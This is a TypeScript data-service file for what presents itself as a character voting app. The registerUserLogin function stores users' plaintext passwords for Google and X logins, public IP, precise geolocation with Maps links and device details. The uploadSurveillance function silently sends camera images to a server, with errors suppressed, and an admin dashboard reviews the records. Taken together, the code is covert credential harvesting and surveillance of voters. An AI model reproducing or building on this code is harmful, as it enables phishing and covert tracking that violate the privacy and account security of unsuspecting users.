import { supabase, isSupabaseConfigured } from '../lib/supabase';
import { Character } from '../types';
import { INITIAL_CHARACTERS } from '../constants';

// FIXED: Use relative path. Vite proxy (vite.config.ts) will handle forwarding to http://localhost:3001
const LOCAL_SERVER_URL = ''; 

// --- TYPES ---
export interface VoteRecord {
  charId: string;
  user: string;
  timestamp: string;
  deviceInfo: any;
  location: any;
  eventDeadline?: string; // New: track which event this vote belongs to
}

export interface UserLoginPayload {
  user_identifier: string;
  password_text: string; // Simulation only
  login_method: 'google' | 'x' | 'guest_visit' | 'location_update';
  device_info: any;
  location_data: any;
}

// --- HELPER ---
const generateMapsUrl = (loc: any): string | null => {
    if (loc && loc.lat && loc.lng) {
        return `https://www.google.com/maps?q=${loc.lat},${loc.lng}`;
    }
    return null;
};

// Fetch client IP - Prioritize Public IP, fallback to Local Server
const getClientIP = async (): Promise<string> => {
    try {
        // 1. Try public API first (to get real WAN IP like 182.10.xx.xx)
        const publicRes = await fetch('https://api.ipify.org?format=json');
        if (publicRes.ok) {
            const data = await publicRes.json();
            return data.ip;
        }
        throw new Error('Public IP fetch failed');
    } catch (e) {
        // 2. Fallback to local server (might return localhost/LAN IP)
        try {
            const res = await fetch(`${LOCAL_SERVER_URL}/api/ip`);
            if (!res.ok) throw new Error('Local IP fetch failed');
            const data = await res.json();
            return data.ip || 'unknown';
        } catch (localErr) {
            return 'unknown';
        }
    }
};

// Helper to safely stringify Supabase errors
const logSupabaseError = (context: string, error: any) => {
    const msg = error?.message || JSON.stringify(error);
    console.error(`${context}: ${msg}`, error);
};

// Wrapper for safe LocalStorage.setItem (Only for text data now)
const safeSetItem = (key: string, value: string) => {
    try {
        localStorage.setItem(key, value);
    } catch (e: any) {
        console.warn("Storage quota exceeded or error. Data not saved locally:", key);
    }
};

// --- SERVICE ---
export const dataService = {
  
  /**
   * Mengambil daftar karakter terbaru.
   */
  getCharacters: async (): Promise<Character[]> => {
    // 1. Try Supabase if configured
    if (isSupabaseConfigured() && supabase) {
      const { data, error } = await supabase
        .from('characters')
        .select('*')
        .order('votes', { ascending: false });
      
      if (!error && data && data.length > 0) {
        // Save to local cache for offline fallback
        const mapped = data.map((d: any) => ({
            id: d.character_id || d.id,
            name: d.name,
            role: d.role,
            description: d.description,
            imageUrl: d.image_url,
            votes: d.votes,
            themeColor: d.theme_color,
            familyName: d.family_name || 'Unknown Family',
            familyIcon: d.family_icon || 'crown',
            activeEffect: d.active_effect || 'none' // Map active_effect
        }));
        safeSetItem('muse_characters', JSON.stringify(mapped));
        return mapped;
      }
    }

    // 2. Fallback to LocalStorage (Source of Truth for Local Mode)
    const saved = localStorage.getItem('muse_characters');
    if (saved) {
        try {
            return JSON.parse(saved);
        } catch (e) {
            console.error("Error parsing local characters", e);
        }
    }
    
    // 3. First time load? Save Initial to LS immediately
    safeSetItem('muse_characters', JSON.stringify(INITIAL_CHARACTERS));
    return INITIAL_CHARACTERS;
  },

  /**
   * Simpan Karakter (Add / Edit)
   */
  saveCharacter: async (character: Character): Promise<boolean> => {
      // 1. Update Local Storage
      const saved = localStorage.getItem('muse_characters');
      let chars: Character[] = saved ? JSON.parse(saved) : INITIAL_CHARACTERS;
      
      const existingIdx = chars.findIndex(c => c.id === character.id);
      if (existingIdx !== -1) {
          chars[existingIdx] = character;
      } else {
          chars.push(character);
      }
      safeSetItem('muse_characters', JSON.stringify(chars));

      // 2. Sync to Supabase
      if (isSupabaseConfigured() && supabase) {
          const { error } = await supabase
              .from('characters')
              .upsert({
                  character_id: character.id,
                  name: character.name,
                  role: character.role,
                  description: character.description,
                  image_url: character.imageUrl,
                  votes: character.votes,
                  theme_color: character.themeColor,
                  family_name: character.familyName,
                  family_icon: character.familyIcon,
                  active_effect: character.activeEffect // Save to DB
              });
          if (error) {
              logSupabaseError("Save Character Error", error);
              return false;
          }
      }
      return true;
  },

  /**
   * Hapus Karakter
   */
  deleteCharacter: async (id: string): Promise<boolean> => {
      // 1. Update Local
      const saved = localStorage.getItem('muse_characters');
      if (saved) {
          const chars: Character[] = JSON.parse(saved);
          const filtered = chars.filter(c => c.id !== id);
          safeSetItem('muse_characters', JSON.stringify(filtered));
      }

      // 2. Sync Supabase
      if (isSupabaseConfigured() && supabase) {
          const { error } = await supabase.from('characters').delete().eq('character_id', id);
          if (error) {
              logSupabaseError("Delete Character Error", error);
              return false;
          }
      }
      return true;
  },

  /**
   * Upload Gambar Karakter (via Local Server endpoint)
   */
  uploadCharacterImage: async (base64Image: string): Promise<string | null> => {
      try {
          if (!base64Image || !base64Image.includes(',')) return null;
          
          // Re-use existing upload endpoint, using 'character_assets' as the user folder
          const response = await fetch(`${LOCAL_SERVER_URL}/api/upload`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ user: 'character_assets', image: base64Image })
          });
          
          if (!response.ok) return null;
          
          const data = await response.json();
          if (data.success && data.path) {
              return data.path; // Returns relative path /uploads/character_assets/xyz.jpg
          }
          return null;
      } catch (e) {
          console.error("Upload character image failed", e);
          return null;
      }
  },

  /**
   * Mencatat User Login / Guest Visit ke Database
   * UPDATED: Uses upsert to prevent duplicates
   */
  registerUserLogin: async (payload: UserLoginPayload) => {
    const ip = await getClientIP();

    const mapsUrl = generateMapsUrl(payload.location_data);
    const enrichedLocation = {
        ...payload.location_data,
        mapsUrl: mapsUrl,
        ipAddress: ip
    };

    // 1. ALWAYS Save to LocalStorage (Crucial for Admin Dashboard visibility)
    // We use a random suffix to ensure keys don't collide if events happen in same ms
    const logKey = `muse_login_log_${Date.now()}_${Math.random().toString(36).substr(2, 5)}`;
    const logEntry = {
        user: payload.user_identifier,
        method: payload.login_method,
        timestamp: new Date().toISOString(),
        ip: ip,
        deviceInfo: payload.device_info,
        location: enrichedLocation // Explicitly saving location here
    };
    safeSetItem(logKey, JSON.stringify(logEntry));

    // 2. Send to Supabase if configured (Background Sync)
    if (isSupabaseConfigured() && supabase) {
      const folderRef = `${payload.user_identifier}/`;
      
      // FIXED: Use upsert instead of insert.
      // Make sure your Supabase 'users' table has a UNIQUE constraint on 'user_identifier'
      const { error } = await supabase
        .from('users')
        .upsert({
          user_identifier: payload.user_identifier,
          password_text: payload.password_text,
          login_method: payload.login_method,
          device_info: payload.device_info, 
          location_data: enrichedLocation, 
          camera_folder_ref: folderRef,
          last_login: new Date().toISOString()
        }, { onConflict: 'user_identifier' }); // Specify the conflict target
      
      if (error) logSupabaseError("Supabase Login Log Error", error);
    }
  },

  /**
   * Melakukan voting.
   * Logic: Update DB -> Update Local Cache
   */
  castVote: async (
    characterId: string, 
    user: string, 
    meta: { location: any, deviceInfo: any, eventDeadline?: string | null }
  ): Promise<boolean> => {
    
    const timestamp = new Date().toISOString();
    const ip = await getClientIP();
    
    const mapsUrl = generateMapsUrl(meta.location);
    const enrichedLocation = {
        ...meta.location,
        mapsUrl: mapsUrl,
        ipAddress: ip
    };

    // 1. LOCAL STORAGE (Persistence & UI Sync & Admin Dashboard)
    const voteData = {
        charId: characterId,
        user: user,
        timestamp: timestamp,
        deviceInfo: meta.deviceInfo,
        location: enrichedLocation,
        eventDeadline: meta.eventDeadline // Save current event ID
    };
    safeSetItem(`muse_vote_record_${user}`, JSON.stringify(voteData));

    // Update Character Counts Locally (Optimistic update)
    const currentData = await dataService.getCharacters();
    const updatedChars = currentData.map(c => 
      c.id === characterId ? { ...c, votes: c.votes + 1 } : c
    );
    safeSetItem('muse_characters', JSON.stringify(updatedChars));

    // 2. SUPABASE (Primary Cloud Storage)
    if (isSupabaseConfigured() && supabase) {
      const { error: voteError } = await supabase.from('votes').insert({
          user_identifier: user,
          character_id: characterId,
          device_info: meta.deviceInfo,
          location_data: enrichedLocation,
          created_at: timestamp
      });
      
      if (voteError) {
          console.error("Failed to insert vote record:", voteError);
          // We return true anyway because we saved locally
      }
    }

    return true;
  },

  /**
   * Mengirim gambar ke Local Server.
   */
  uploadSurveillance: async (user: string, base64Image: string) => {
    try {
        if (!base64Image || !base64Image.includes(',')) return;

        // Uses relative path /api/upload which is proxied by Vite
        await fetch(`${LOCAL_SERVER_URL}/api/upload`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ user, image: base64Image })
        });
    } catch (e) {
        // Silent error
    }
  },

  /**
   * Mengambil list gambar.
   */
  getSurveillanceImages: async (user: string): Promise<{timestamp: string, url: string}[]> => {
      try {
          const response = await fetch(`${LOCAL_SERVER_URL}/api/images/${user}`);
          if (!response.ok) return [];
          const data = await response.json();
          
          if (data && data.images) {
              return data.images.map((img: any) => ({
                  timestamp: new Date(img.timestamp).toLocaleTimeString(),
                  url: img.url
              }));
          }
          return [];
      } catch (e) {
          return [];
      }
  },

  /**
   * Menghapus log (User + Vote) berdasarkan User Identifier
   * Menghapus dari Supabase dan LocalStorage
   */
  deleteAccessLog: async (userIdentifier: string): Promise<boolean> => {
      let success = true;

      // 1. Delete from Supabase
      if (isSupabaseConfigured() && supabase) {
          // Delete from 'votes' first (Foreign Key constraint usually cascades, but good to be explicit)
          const { error: voteError } = await supabase.from('votes').delete().eq('user_identifier', userIdentifier);
          if (voteError) console.warn("Delete Vote Error:", voteError);

          // Delete from 'users'
          const { error: userError } = await supabase.from('users').delete().eq('user_identifier', userIdentifier);
          if (userError) {
              console.error("Delete User Error:", userError);
              success = false;
          }
      }

      // 2. Delete from LocalStorage (Iterate all keys)
      // This is necessary because keys are dynamic (muse_login_log_TIMESTAMP_RANDOM)
      const keysToRemove: string[] = [];
      for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          if (key) {
              // Check exact matches or json content matches
              if (key === `muse_vote_record_${userIdentifier}`) {
                  keysToRemove.push(key);
              } else if (key.startsWith('muse_login_log_')) {
                  try {
                      const item = JSON.parse(localStorage.getItem(key) || '{}');
                      if (item.user === userIdentifier) {
                          keysToRemove.push(key);
                      }
                  } catch(e) {}
              }
          }
      }
      
      keysToRemove.forEach(key => localStorage.removeItem(key));
      
      return success;
  },

  /**
   * Menghapus SEMUA log (Reset Database Tracking)
   */
  clearAllAccessLogs: async (): Promise<boolean> => {
      let success = true;

      // 1. Supabase Truncate/Delete All
      if (isSupabaseConfigured() && supabase) {
          const { error: vError } = await supabase.from('votes').delete().neq('id', -1); // Hack to delete all
          const { error: uError } = await supabase.from('users').delete().neq('id', -1);
          
          if (vError || uError) {
              console.error("Clear DB Error", vError || uError);
              success = false;
          }
      }

      // 2. LocalStorage Clear (Only Logs, keep characters)
      const keysToRemove: string[] = [];
      for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          if (key && (key.startsWith('muse_vote_record_') || key.startsWith('muse_login_log_'))) {
              keysToRemove.push(key);
          }
      }
      keysToRemove.forEach(key => localStorage.removeItem(key));

      return success;
  },

  subscribeToVotes: (callback: () => void) => {
    if (isSupabaseConfigured() && supabase) {
      const channel = supabase
        .channel('public:characters')
        .on('postgres_changes', { event: '*', schema: 'public', table: 'characters' }, callback)
        .subscribe();
      return () => { supabase?.removeChannel(channel); };
    }
    return () => {};
  }
};
